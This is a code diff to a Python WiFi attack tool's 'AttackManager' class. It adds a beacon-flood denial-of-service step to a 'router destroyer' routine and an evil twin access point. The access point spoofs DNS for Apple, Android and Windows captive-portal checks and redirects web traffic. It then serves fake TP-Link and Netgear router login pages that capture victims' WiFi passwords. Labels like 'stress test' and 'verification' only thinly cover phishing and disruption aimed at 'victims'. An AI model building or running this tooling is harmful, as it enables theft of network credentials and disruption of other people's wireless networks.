@@ -7,6 +7,7 @@ import subprocess
 import http.server
 import socketserver
 import requests
+import json
 from typing import List
 
 class AttackManager:
@@ -19,6 +20,32 @@ class AttackManager:
         self.evil_twin_running = False
         self.captured_password = None
         self.phishing_server = None
+        self.router_brand = "Generic"
+
+        # OUI Database for brand detection
+        self.oui_database = {
+            "C0:25:E9": "TP-Link",
+            "D8:0D:17": "TP-Link", 
+            "A0:04:60": "Netgear",
+            "2C:B0:5D": "Netgear",
+            "F8:8F:CA": "Google Fiber",
+            "B0:4E:26": "Linksys",
+            "00:1B:2F": "ASUS",
+            "00:1D:60": "ASUS",
+            "00:24:B2": "Belkin",
+            "00:1A:2B": "D-Link",
+            "00:1C:F0": "D-Link",
+            "00:26:5A": "Cisco",
+            "00:1E:7E": "Huawei",
+            "00:1E:74": "Huawei",
+            "00:1A:11": "Zyxel",
+            "00:14:D1": "Zyxel"
+        }
+
+    def detect_router_brand(self, bssid):
+        """Detect router brand from BSSID OUI"""
+        oui_prefix = bssid.upper()[:8]  # First 6 chars + colon
+        return self.oui_database.get(oui_prefix, "Generic")
 
     def single_target_attack(self):
         """Professional Single Target Attack - DUAL ENGINE"""
@@ -181,7 +208,7 @@ class AttackManager:
                 print("\033[1;33m[❌] Professional disruption cancelled\033[0m")
 
     def router_destroyer(self):
-        """Professional Router Stress Test - HARDWARE STRESS"""
+        """Professional Router Stress Test - HARDWARE STRESS + PHANTOM MODE"""
         print("\033[1;31m[💀] Professional router assessment...\033[0m")
         
         confirm1 = input("\033[1;31m[?] Type 'STRESS' to confirm: \033[0m")
@@ -204,7 +231,7 @@ class AttackManager:
                 self.start_professional_router_stress(target)
 
     def start_professional_router_stress(self, target):
-        """Start professional router stress test"""
+        """Start professional router stress test with PHANTOM MODE"""
         self.core.set_current_operation("ROUTER_STRESS_TEST")
         self.attack_running = True
         
@@ -241,8 +268,19 @@ class AttackManager:
             self.attack_processes.append(proc3)
             self.core.add_attack_process(proc3)
         
+        # PHANTOM MODE: Beacon Flood to overwhelm devices
+        print("\033[1;31m[👻] VECTOR 4: PHANTOM MODE - Beacon Flood\033[0m")
+        proc4 = self.core.run_command(
+            f"mdk4 {self.core.mon_interface} b -c {target['channel']} -s 1000 > /tmp/beacon_flood.log 2>&1 &",
+            background=True
+        )
+        if proc4:
+            self.attack_processes.append(proc4)
+            self.core.add_attack_process(proc4)
+        
         print(f"\033[1;32m[✅] Professional stress test active\033[0m")
         print(f"\033[1;31m[💥] Router {target['essid']} under hardware stress!\033[0m")
+        print(f"\033[1;31m[👻] PHANTOM MODE: Overwhelming devices with fake networks!\033[0m")
         
         # Stress animation
         anim_thread = threading.Thread(target=self.show_router_stress_animation)
@@ -257,7 +295,7 @@ class AttackManager:
         print("\033[1;32m[✅] Professional stress test terminated\033[0m")
 
     def advanced_evil_twin(self):
-        """Professional Access Point Replication - OPEN AP + VERIFICATION"""
+        """Professional Access Point Replication - CHAMELEON ENGINE"""
         print("\033[1;36m[→] Professional AP replication protocol...\033[0m")
         
         # Always fresh scan
@@ -266,6 +304,9 @@ class AttackManager:
             target = self.scanner.select_target()
             
             if target:
+                # Detect router brand for targeted phishing
+                self.router_brand = self.detect_router_brand(target['bssid'])
+                print(f"\033[1;34m[🎭] CHAMELEON ENGINE: Detected {self.router_brand} router\033[0m")
                 print(f"\033[1;34m[👥] Professional replication: {target['essid']}\033[0m")
                 
                 # First capture handshake for verification
@@ -317,7 +358,7 @@ class AttackManager:
         return result and "1 handshake" in result.stdout
 
     def start_professional_open_ap(self, target):
-        """Start professional open AP with verification loop"""
+        """Start professional open AP with CHAMELEON ENGINE"""
         try:
             self.core.set_current_operation("AP_REPLICATION")
             self.evil_twin_running = True
@@ -346,12 +387,24 @@ wpa=0
             with open("/tmp/pro_open_ap.conf", "w") as f:
                 f.write(hostapd_conf)
             
-            # Professional dnsmasq configuration with DNS spoofing
+            # Enhanced dnsmasq configuration with OS-specific captive portals
             dnsmasq_conf = f"""
 interface={self.core.mon_interface}
 dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
 dhcp-option=3,192.168.1.1
 dhcp-option=6,8.8.8.8
+# Apple Captive Portal Triggers
+address=/captive.apple.com/192.168.1.1
+address=/www.apple.com/192.168.1.1
+address=/ibarrel.com/192.168.1.1
+# Android Captive Portal Triggers  
+address=/connectivitycheck.gstatic.com/192.168.1.1
+address=/connectivitycheck.android.com/192.168.1.1
+address=/clients3.google.com/192.168.1.1
+# Windows Captive Portal Triggers
+address=/www.msftncsi.com/192.168.1.1
+address=/ipv6.msftncsi.com/192.168.1.1
+# Generic fallback
 address=/#/192.168.1.1
 log-queries
 log-dhcp
@@ -360,8 +413,13 @@ log-dhcp
             with open("/tmp/pro_dnsmasq.conf", "w") as f:
                 f.write(dnsmasq_conf)
             
-            # Configure interface
+            # Configure interface and enable IP forwarding
             self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
+            self.core.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            self.core.run_command("iptables --flush")
+            self.core.run_command("iptables -t nat --flush")
+            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80")
+            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80")
             
             # Start professional services
             print("\033[1;36m[→] Starting professional services...\033[0m")
@@ -377,9 +435,9 @@ log-dhcp
             
             time.sleep(5)
             
-            # Start phishing web server
-            print("\033[1;36m[→] Starting verification web server...\033[0m")
-            web_thread = threading.Thread(target=self.start_phishing_server)
+            # Start CHAMELEON phishing web server
+            print("\033[1;36m[→] Starting CHAMELEON verification web server...\033[0m")
+            web_thread = threading.Thread(target=self.start_chameleon_phishing_server, args=(target,))
             web_thread.daemon = True
             web_thread.start()
             
@@ -395,6 +453,7 @@ log-dhcp
             
             print("\033[1;32m[✅] Professional Open AP replication active!\033[0m")
             print(f"\033[1;32m[📡] Network: {target['essid']} (Open Access)\033[0m")
+            print(f"\033[1;32m[🎭] CHAMELEON: Serving {self.router_brand} login page\033[0m")
             print("\033[1;32m[🔓] No password required - victims auto-connect\033[0m")
             print("\033[1;33m[👀] Professional verification active...\033[0m")
             print("\033[1;33m[⏹️] Press Enter to stop professional replication...\033[0m")
@@ -416,28 +475,17 @@ log-dhcp
             self.stop_professional_ap()
             self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")
 
-    def start_phishing_server(self):
-        """Start phishing web server for password capture"""
-        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
+    def start_chameleon_phishing_server(self, target):
+        """Start CHAMELEON phishing web server with brand-specific pages"""
+        class ChameleonHandler(http.server.SimpleHTTPRequestHandler):
             def do_GET(self):
                 if self.path == '/':
                     self.send_response(200)
                     self.send_header('Content-type', 'text/html')
                     self.end_headers()
                     
-                    html = """
-                    <html>
-                    <head><title>Network Authentication Required</title></head>
-                    <body>
-                    <h2>Network Authentication Required</h2>
-                    <p>Please enter your WiFi password to continue:</p>
-                    <form method="POST">
-                    <input type="password" name="password" placeholder="WiFi Password" required>
-                    <input type="submit" value="Connect">
-                    </form>
-                    </body>
-                    </html>
-                    """
+                    # Brand-specific HTML templates
+                    html = self.generate_brand_html(target)
                     self.wfile.write(html.encode())
                 else:
                     self.send_error(404)
@@ -449,6 +497,8 @@ log-dhcp
                 # Extract password
                 if 'password=' in post_data:
                     password = post_data.split('password=')[1].split('&')[0]
+                    # URL decode
+                    password = requests.utils.unquote(password)
                     # Save password for verification
                     with open("/tmp/captured_password.txt", "w") as f:
                         f.write(password)
@@ -457,10 +507,91 @@ log-dhcp
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                self.wfile.write(b"<html><body><h2>Connecting...</h2></body></html>")
+                self.wfile.write(b"<html><body><h2>Connecting to network...</h2></body></html>")
+            
+            def generate_brand_html(self, target):
+                """Generate brand-specific login page"""
+                brand = self.server.router_brand
+                essid = target['essid']
+                
+                if brand == "TP-Link":
+                    return f"""
+                    <html>
+                    <head><title>TP-Link Wireless Router</title>
+                    <style>
+                    body {{ font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }}
+                    .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+                    .header {{ background: #4A90E2; color: white; padding: 15px; margin: -30px -30px 20px -30px; border-radius: 5px 5px 0 0; }}
+                    input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }}
+                    input[type="submit"] {{ background: #4A90E2; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }}
+                    </style>
+                    </head>
+                    <body>
+                    <div class="container">
+                        <div class="header">
+                            <h2>TP-Link Wireless Router</h2>
+                        </div>
+                        <h3>Network: {essid}</h3>
+                        <p>Please enter your WiFi password to continue:</p>
+                        <form method="POST">
+                        <input type="password" name="password" placeholder="WiFi Password" required>
+                        <input type="submit" value="Connect to Network">
+                        </form>
+                    </div>
+                    </body>
+                    </html>
+                    """
+                elif brand == "Netgear":
+                    return f"""
+                    <html>
+                    <head><title>NETGEAR Router</title>
+                    <style>
+                    body {{ font-family: Arial, sans-serif; background: #2C2C2C; margin: 0; padding: 20px; color: white; }}
+                    .container {{ max-width: 400px; margin: 50px auto; background: #3A3A3A; padding: 30px; border-radius: 5px; }}
+                    .header {{ background: #6BBE4F; color: white; padding: 15px; margin: -30px -30px 20px -30px; border-radius: 5px 5px 0 0; }}
+                    input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #555; border-radius: 3px; background: #2C2C2C; color: white; }}
+                    input[type="submit"] {{ background: #6BBE4F; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }}
+                    </style>
+                    </head>
+                    <body>
+                    <div class="container">
+                        <div class="header">
+                            <h2>NETGEAR Router</h2>
+                        </div>
+                        <h3>Network: {essid}</h3>
+                        <p>Enter your network security key:</p>
+                        <form method="POST">
+                        <input type="password" name="password" placeholder="Network Security Key" required>
+                        <input type="submit" value="Apply">
+                        </form>
+                    </div>
+                    </body>
+                    </html>
+                    """
+                else:  # Generic fallback
+                    return f"""
+                    <html>
+                    <head><title>Network Authentication Required</title></head>
+                    <body>
+                    <h2>Network Authentication Required</h2>
+                    <p>Please enter your WiFi password for network <strong>{essid}</strong> to continue:</p>
+                    <form method="POST">
+                    <input type="password" name="password" placeholder="WiFi Password" required>
+                    <input type="submit" value="Connect">
+                    </form>
+                    </body>
+                    </html>
+                    """
         
         try:
-            self.phishing_server = socketserver.TCPServer(("", 80), PhishingHandler)
+            # Create custom server with router brand info
+            class BrandAwareServer(socketserver.TCPServer):
+                def __init__(self, *args, **kwargs):
+                    self.router_brand = self.router_brand
+                    super().__init__(*args, **kwargs)
+            
+            BrandAwareServer.router_brand = self.router_brand
+            self.phishing_server = BrandAwareServer(("", 80), ChameleonHandler)
             self.phishing_server.serve_forever()
         except Exception as e:
             print(f"\033[1;31m[✘] Phishing server error: {e}\033[0m")
